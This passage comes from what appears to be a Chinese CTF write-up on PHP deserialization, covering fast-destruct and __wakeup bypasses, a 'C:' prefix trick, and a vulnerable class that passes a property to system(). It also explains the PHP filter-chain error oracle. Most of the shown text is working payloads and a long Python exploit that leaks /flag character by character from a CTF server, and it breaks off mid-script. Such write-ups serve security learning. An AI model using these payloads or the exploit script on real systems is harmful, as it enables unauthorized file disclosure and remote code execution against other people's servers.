<li><pre><code>- 删除)。
- 类属性的数量不一致。
- 属性键的长度不匹配。
- 属性值的长度不匹配。
- 删除；

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 3.fast_destruct</span><br><span class="line"></span><br><span class="line">&gt; 有点类似于强制gc</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
<p>删除最后的大括号<br>数组对象占用指针（改数字)<br>&#x2F;&#x2F;a:2:{i:0;O:1:”a”:1:{s:1:”a”;s:3:”123”;}i:1;s:4:”1234”;}   这是正常的<br>&#x2F;&#x2F;a:2:{i:0;O:1:”a”:1:{s:1:”a”;s:3:”123”;}i:0;s:4:”1234”;}   payload<br>&#x2F;&#x2F;a:2:{i:0;O:1:”a”:1:{s:1:”a”;s:3:”123”;}i:1;s:4:”1234”;    payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">利用方式就是 a=null是直接将a 指向的数据结构置空，同时将其引用计数归0。</span><br><span class="line"></span><br><span class="line">data=O:1:&quot;A&quot;:2:&#123;s:4:&quot;info&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;end&quot;;N;&#125;s:3:&quot;end&quot;;s:2:&quot;1&quot;;&#125;</span><br><span class="line">所以类似于这样写，他会产生垃圾，然后被GC回收，引发fast-destruct</span><br><span class="line"></span><br><span class="line">##### 属性值的长度不匹配</span><br><span class="line"></span><br><span class="line">data=O:1:&quot;A&quot;:2:&#123;s:4:&quot;info&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;end&quot;;N;&#125;s:3:&quot;end&quot;;s:1:&quot;12&quot;;&#125;</span><br><span class="line">很可能也只是GC回收的衍生</span><br><span class="line"></span><br><span class="line">##### 类属性的数量不一致</span><br><span class="line"></span><br><span class="line">这个描述近乎于cve-2016-7124</span><br><span class="line"></span><br><span class="line">O:1:&quot;A&quot;:3:&#123;s:4:&quot;info&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;end&quot;;N;&#125;s:3:&quot;end&quot;;s:1:&quot;1&quot;;&#125;</span><br><span class="line">效果也是</span><br><span class="line"></span><br><span class="line">这个的确是GC回收的衍生，就是数据结果指针发生了异常</span><br><span class="line"></span><br><span class="line">##### 深入思考</span><br><span class="line"></span><br><span class="line">fast-destruct的本质是序列化的字符串格式不对导致反序列失败反而成为垃圾数据然后触发强行GC</span><br><span class="line"></span><br><span class="line">本质都是GC回收机制在存在destruct的前提下绕过wakeup衍生</span><br><span class="line"></span><br><span class="line">但是如果想要不执行wakup，就必须在有wakup魔术方法的那个类的结构进行破坏，可以采用删除分号或者属性数量不一致的方法</span><br><span class="line"></span><br><span class="line">#### 4.php引用赋值&amp;</span><br><span class="line"></span><br><span class="line">在php里，我们可使用引用的方式让两个变量同时指向同一个内存地址，这样对其中一个变量操作时，另一个变量的值也会随之改变。</span><br><span class="line"></span><br><span class="line">#### 5.使用C绕过</span><br><span class="line"></span><br><span class="line">在这里，当开头添加为c的时候</span><br><span class="line"></span><br><span class="line">只能执行destruct函数，无法添加任何方法</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class ctfshow&#123;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        die(&quot;not allowed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        system($this-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = $_GET[&#x27;1+1&gt;2&#x27;];</span><br><span class="line"></span><br><span class="line">if(!preg_match(&quot;/^[Oa]:[\d]+/i&quot;, $data))&#123;</span><br><span class="line">    unserialize($data);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">class ctfshow&#123;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        die(&quot;not allowed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        system($this-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">$a=new ctfshow();</span><br><span class="line">echo serialize($a);</span><br><span class="line">#O:7:&quot;ctfshow&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>这里也是这样的，直接传入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:8:&quot;Saferman&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="无回显file函数的新思路"><a href="#无回显file函数的新思路" class="headerlink" title="无回显file函数的新思路"></a>无回显file函数的新思路</h3><p>最后这个file函数是真的很难，file将一个文件读取到数组内，但是这里没有回显，该怎么处理呢</p>
<h4 id="1-filter-chain造成rce"><a href="#1-filter-chain造成rce" class="headerlink" title="1.filter-chain造成rce"></a>1.filter-chain造成rce</h4><p>这是一种新的思路，先从这里说起</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230826221100047.png" alt="image-20230826221100047"></p>
<p>这里是通过利用filter的特性</p>
<p><a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator">GitHub - synacktiv&#x2F;php_filter_chain_generator</a></p>
<p>filter可以通过各种的编码和字符集转换，构造出不同的字符，然后包含到文件内部中</p>
<p>如果是使用了include函数，file_get_content函数等，会直接包含到页面里面，可以直接rce，但是这里是file函数，不能执行</p>
<h4 id="2-侧信道攻击"><a href="#2-侧信道攻击" class="headerlink" title="2.侧信道攻击"></a>2.侧信道攻击</h4><blockquote>
<p>真的难找，找了6个小时才找出来的</p>
</blockquote>
<p>什么是侧信道。侧信道其实就是根据一个二元或者多元条件关系差，可以让我们以”盲注”的形式，去获取某些信息的一种方法，测信道广义上是非常广泛的。在web题目中他们通常以盲注的形式出现</p>
<p>通过构造fliter链子，不断的请求内存区域的同一块资源区</p>
<p>通过判断彼此之间服务器响应的时间差值，来得到最终的flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">join</span>(<span class="params">*x</span>):</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;|&#x27;</span>.join(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">err</span>(<span class="params">s</span>):</span><br><span class="line">	<span class="built_in">print</span>(s)</span><br><span class="line">	<span class="keyword">raise</span> ValueError</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">req</span>(<span class="params">s</span>):</span><br><span class="line">	data =<span class="string">f&#x27;php://filter/<span class="subst">&#123;s&#125;</span>/resource=/flag&#x27;</span></span><br><span class="line">	</span><br><span class="line">	url=<span class="string">&quot;http://39.105.5.7:43213/?my[secret.flag=C:8:%22Saferman%22:0:&#123;&#125;&amp;secret=&quot;</span>+data</span><br><span class="line">	<span class="keyword">return</span> requests.get(url).status_code == <span class="number">500</span></span><br><span class="line"></span><br><span class="line">blow_up_enc = join(*[<span class="string">&#x27;convert.quoted-printable-encode&#x27;</span>]*<span class="number">1000</span>)</span><br><span class="line">blow_up_utf32 = <span class="string">&#x27;convert.iconv.L1.UCS-4LE&#x27;</span></span><br><span class="line">blow_up_inf = join(*[blow_up_utf32]*<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">header = <span class="string">&#x27;convert.base64-encode|convert.base64-encode&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start get baseline blowup</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Calculating blowup&#x27;</span>)</span><br><span class="line">baseline_blowup = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">	payload = join(*[blow_up_utf32]*n)</span><br><span class="line">	<span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;payload&#125;</span>&#x27;</span>):</span><br><span class="line">		baseline_blowup = n</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;baseline blowup is <span class="subst">&#123;baseline_blowup&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">trailer = join(*[blow_up_utf32]*(baseline_blowup-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> req(<span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;trailer&#125;</span>&#x27;</span>) == <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;detecting equals&#x27;</span>)</span><br><span class="line">j = [</span><br><span class="line">	req(<span class="string">f&#x27;convert.base64-encode|convert.base64-encode|<span class="subst">&#123;blow_up_enc&#125;</span>|<span class="subst">&#123;trailer&#125;</span>&#x27;</span>),</span><br><span class="line">	req(<span class="string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode<span class="subst">&#123;blow_up_enc&#125;</span>|<span class="subst">&#123;trailer&#125;</span>&#x27;</span>),</span><br><span class="line">	req(<span class="string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|<span class="subst">&#123;blow_up_enc&#125;</span>|<span class="subst">&#123;trailer&#125;</span>&#x27;</span>)</span><br><span class="line">]</span><br><span class="line"><span class="built_in">print</span>(j)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">sum</span>(j) != <span class="number">2</span>:</span><br><span class="line">	err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> j[<span class="number">0</span>] == <span class="literal">False</span>:</span><br><span class="line">	header = <span class="string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> j[<span class="number">1</span>] == <span class="literal">False</span>:</span><br><span class="line">	header = <span class="string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base64-encode&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> j[<span class="number">2</span>] == <span class="literal">False</span>:</span><br><span class="line">	header = <span class="string">f&#x27;convert.base64-encode|convert.base64-encode&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;j: <span class="subst">&#123;j&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;header: <span class="subst">&#123;header&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flip = <span class="string">&quot;convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode&quot;</span></span><br><span class="line">r2 = <span class="string">&quot;convert.iconv.CSUNICODE.UCS-2BE&quot;</span></span><br><span class="line">r4 = <span class="string">&quot;convert.iconv.UCS-4LE.10646-1:1993&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_nth</span>(<span class="params">n</span>):</span><br><span class="line">	<span class="keyword">global</span> flip, r2, r4</span><br><span class="line">	o = []</span><br><span class="line">	chunk = n // <span class="number">2</span></span><br><span class="line">	<span class="keyword">if</span> chunk % <span class="number">2</span> == <span class="number">1</span>: o.append(r4)</span><br><span class="line">	o.extend([flip, r4] * (chunk // <span class="number">2</span>))</span><br><span class="line">	<span class="keyword">if</span> (n % <span class="number">2</span> == <span class="number">1</span>) ^ (chunk % <span class="number">2</span> == <span class="number">1</span>): o.append(r2)</span><br><span class="line">	<span class="keyword">return</span> join(*o)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rot1 = <span class="string">&#x27;convert.iconv.437.CP930&#x27;</span></span><br><span class="line">be = <span class="string">&#x27;convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode&#x27;</span></span><br><span class="line">o = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_letter</span>(<span class="params">prefix</span>):</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># a-f A-F 0-9</span></span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="comment"># a-e</span></span><br><span class="line">			<span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">				<span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|&#x27;</span> + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="number">1</span>) + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">					<span class="keyword">return</span> <span class="string">&#x27;edcba&#x27;</span>[n]</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">		<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="comment"># A-E</span></span><br><span class="line">			<span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">				<span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|&#x27;</span> + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="number">1</span>) + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">					<span class="keyword">return</span> <span class="string">&#x27;EDCBA&#x27;</span>[n]</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">		<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.CSISO5427CYRILLIC.855|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">		<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="comment"># f</span></span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;f&#x27;</span></span><br><span class="line">		<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="comment"># F</span></span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;F&#x27;</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># n-s N-S</span></span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="comment"># n-r</span></span><br><span class="line">			<span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">				<span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|&#x27;</span> + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="number">1</span>) + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">					<span class="keyword">return</span> <span class="string">&#x27;rqpon&#x27;</span>[n]</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">		<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="comment"># N-R</span></span><br><span class="line">			<span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">				<span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|&#x27;</span> + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="number">1</span>) + <span class="string">f&#x27;<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">					<span class="keyword">return</span> <span class="string">&#x27;RQPON&#x27;</span>[n]</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">		<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="comment"># s</span></span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;s&#x27;</span></span><br><span class="line">		<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="comment"># S</span></span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;S&#x27;</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># i j k</span></span><br><span class="line">		<span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;k&#x27;</span></span><br><span class="line">		<span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;j&#x27;</span></span><br><span class="line">		<span 